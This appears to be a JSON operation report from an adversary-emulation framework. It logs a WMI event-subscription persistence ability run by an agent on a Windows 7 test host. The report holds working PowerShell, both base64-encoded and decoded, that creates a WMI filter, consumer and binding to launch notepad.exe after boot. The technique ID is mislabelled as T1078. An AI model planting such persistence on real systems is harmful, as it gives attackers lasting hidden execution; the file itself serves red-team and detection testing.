{
    "adversary": {
        "adversary_id": "6b5e74b0-65b2-4b32-9963-7ebb1d6fed4e",
        "description": "Event",
        "id": 17,
        "name": "WMI",
        "phases": {
            "1": [
                {
                    "ability_id": "c1cd6388-3ced-48c7-a511-0434c6baT1084",
                    "adversary_map_id": 138,
                    "cleanup": "",
                    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system",
                    "executor": "psh",
                    "id": 187,
                    "name": "WMI Event Subscription",
                    "parsers": [],
                    "payload": [],
                    "platform": "windows",
                    "requirements": [],
                    "tactic": "execution",
                    "technique_id": "T1078",
                    "technique_name": "Windows Management Instrumentation Event Subscription",
                    "test": "JHdtaVBhcmFtcyA9IEB7CkNvbXB1dGVybmFtZT0kZW52OkNPTVBVVEVSTkFNRTsKRXJyb3JBY3Rpb249J1N0b3AnOwpOYW1lU3BhY2U9J3Jvb3Rcc3Vic2NyaXB0aW9uJzsKfQokd21pUGFyYW1zLkNsYXNzID0gIl9fRXZlbnRGaWx0ZXIiOwokd21pUGFyYW1zLkFyZ3VtZW50cyA9IEB7Ck5hbWUgPSAiU2VydmljZUZpbHRlckRzbGFicyI7CkV2ZW50TmFtZXNwYWNlID0gInJvb3RcQ0lNVjIiOwpRdWVyeUxhbmd1YWdlID0gIldRTCI7ClF1ZXJ5PSJTRUxFQ1QgKiBGUk9NIF9fSW5zdGFuY2VNb2RpZmljYXRpb25FdmVudCBXSVRISU4gNjAgV0hFUkUgVGFyZ2V0SW5zdGFuY2UgSVNBICdXaW4zMl9QZXJmRm9ybWF0dGVkRGF0YV9QZXJmT1NfU3lzdGVtJyBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lID49IDI0MCBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lIDwgMzI1Igp9OwokZmlsdGVyUmVzdWx0ID0gU2V0LVdtaUluc3RhbmNlIEB3bWlQYXJhbXM7CiR3bWlQYXJhbXMuQ2xhc3M9J0NvbW1hbmRMaW5lRXZlbnRDb25zdW1lcic7CiR3bWlQYXJhbXMuQXJndW1lbnRzID0gQHsKTmFtZT0nU2VydmljZUNvbnN1bWVyRHNsYWJzJzsKQ29tbWFuZExpbmVUZW1wbGF0ZT0iJCgkRW52OlN5c3RlbVJvb3QpXFN5c3RlbTMyXG5vdGVwYWQuZXhlIjsKfQokY29uc3VtZXJSZXN1bHQgPSBTZXQtV21pSW5zdGFuY2UgQHdtaVBhcmFtczsKJHdtaVBhcmFtcy5DbGFzcz0nX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZycKJHdtaVBhcmFtcy5Bcmd1bWVudHMgPSBAewogICAgICAgIEZpbHRlciA9ICRmaWx0ZXJSZXN1bHQKICAgICAgICBDb25zdW1lciA9ICRjb25zdW1lclJlc3VsdAogICAgICAgIH0KJGJpbmRpbmdSZXN1bHQgPSBTZXQtV21pSW5zdGFuY2UgQHdtaVBhcmFtcw=="
                },
                {
                    "ability_id": "c1cd6388-3ced-48c7-a511-0434c6baT1084",
                    "adversary_map_id": 138,
                    "cleanup": "",
                    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system",
                    "executor": "pwsh",
                    "id": 188,
                    "name": "WMI Event Subscription",
                    "parsers": [],
                    "payload": [],
                    "platform": "windows",
                    "requirements": [],
                    "tactic": "execution",
                    "technique_id": "T1078",
                    "technique_name": "Windows Management Instrumentation Event Subscription",
                    "test": "JHdtaVBhcmFtcyA9IEB7CkNvbXB1dGVybmFtZT0kZW52OkNPTVBVVEVSTkFNRTsKRXJyb3JBY3Rpb249J1N0b3AnOwpOYW1lU3BhY2U9J3Jvb3Rcc3Vic2NyaXB0aW9uJzsKfQokd21pUGFyYW1zLkNsYXNzID0gIl9fRXZlbnRGaWx0ZXIiOwokd21pUGFyYW1zLkFyZ3VtZW50cyA9IEB7Ck5hbWUgPSAiU2VydmljZUZpbHRlckRzbGFicyI7CkV2ZW50TmFtZXNwYWNlID0gInJvb3RcQ0lNVjIiOwpRdWVyeUxhbmd1YWdlID0gIldRTCI7ClF1ZXJ5PSJTRUxFQ1QgKiBGUk9NIF9fSW5zdGFuY2VNb2RpZmljYXRpb25FdmVudCBXSVRISU4gNjAgV0hFUkUgVGFyZ2V0SW5zdGFuY2UgSVNBICdXaW4zMl9QZXJmRm9ybWF0dGVkRGF0YV9QZXJmT1NfU3lzdGVtJyBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lID49IDI0MCBBTkQgVGFyZ2V0SW5zdGFuY2UuU3lzdGVtVXBUaW1lIDwgMzI1Igp9OwokZmlsdGVyUmVzdWx0ID0gU2V0LVdtaUluc3RhbmNlIEB3bWlQYXJhbXM7CiR3bWlQYXJhbXMuQ2xhc3M9J0NvbW1hbmRMaW5lRXZlbnRDb25zdW1lcic7CiR3bWlQYXJhbXMuQXJndW1lbnRzID0gQHsKTmFtZT0nU2VydmljZUNvbnN1bWVyRHNsYWJzJzsKQ29tbWFuZExpbmVUZW1wbGF0ZT0iJCgkRW52OlN5c3RlbVJvb3QpXFN5c3RlbTMyXG5vdGVwYWQuZXhlIjsKfQokY29uc3VtZXJSZXN1bHQgPSBTZXQtV21pSW5zdGFuY2UgQHdtaVBhcmFtczsKJHdtaVBhcmFtcy5DbGFzcz0nX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZycKJHdtaVBhcmFtcy5Bcmd1bWVudHMgPSBAewogICAgICAgIEZpbHRlciA9ICRmaWx0ZXJSZXN1bHQKICAgICAgICBDb25zdW1lciA9ICRjb25zdW1lclJlc3VsdAogICAgICAgIH0KJGJpbmRpbmdSZXN1bHQgPSBTZXQtV21pSW5zdGFuY2UgQHdtaVBhcmFtcw=="
                }
            ]
        }
    },
    "facts": [],
    "finish": "2019-10-29 17:14:51",
    "host_group": [
        {
            "architecture": "amd64",
            "executors": [
                {
                    "executor": "cmd",
                    "preferred": 1
                },
                {
                    "executor": "psh",
                    "preferred": 0
                },
                {
                    "executor": "shellcode_amd64",
                    "preferred": 0
                }
            ],
            "host_group": "my_group",
            "id": 1,
            "last_seen": "2019-10-29 17:14:50",
            "last_trusted_seen": "2019-10-29 17:07:53",
            "location": "C:\\Users\\Public\\sandcat.exe",
            "paw": "AJ-Win7x64$AJ-Win7x64\\testuser",
            "pid": 4084,
            "platform": "windows",
            "ppid": 1904,
            "server": "http://10.203.202.154:8888",
            "sleep_max": 60,
            "sleep_min": 60,
            "trusted": 0
        }
    ],
    "id": 2,
    "jitter": "4/8",
    "name": "asd1",
    "planner": {
        "id": 1,
        "module": "plugins.stockpile.app.sequential",
        "name": "sequential",
        "params": {}
    },
    "skipped_abilities": [
        {
            "AJ-Win7x64$AJ-Win7x64\\testuser": []
        }
    ],
    "start": "2019-10-29 17:14:00",
    "steps": {
        "AJ-Win7x64$AJ-Win7x64\\testuser": {
            "agent_id": 1,
            "steps": [
                {
                    "ability_id": "c1cd6388-3ced-48c7-a511-0434c6baT1084",
                    "attack": {
                        "tactic": "execution",
                        "technique_id": "T1078",
                        "technique_name": "Windows Management Instrumentation Event Subscription"
                    },
                    "command": "$wmiParams = @{Computername=$env:COMPUTERNAME;ErrorAction='Stop';NameSpace='root\\subscription';}$wmiParams.Class = \"__EventFilter\";$wmiParams.Arguments = @{Name = \"ServiceFilterDslabs\";EventNamespace = \"root\\CIMV2\";QueryLanguage = \"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};$filterResult = Set-WmiInstance @wmiParams;$wmiParams.Class='CommandLineEventConsumer';$wmiParams.Arguments = @{Name='ServiceConsumerDslabs';CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}$consumerResult = Set-WmiInstance @wmiParams;$wmiParams.Class='__FilterToConsumerBinding'$wmiParams.Arguments = @{        Filter = $filterResult        Consumer = $consumerResult        }$bindingResult = Set-WmiInstance @wmiParams",
                    "delegated": "2019-10-29 17:14:49.977150",
                    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system",
                    "executor": "psh",
                    "name": "WMI Event Subscription",
                    "platform": "windows",
                    "run": "2019-10-29 17:14:50",
                    "status": 0
                }
            ]
        }
    }
}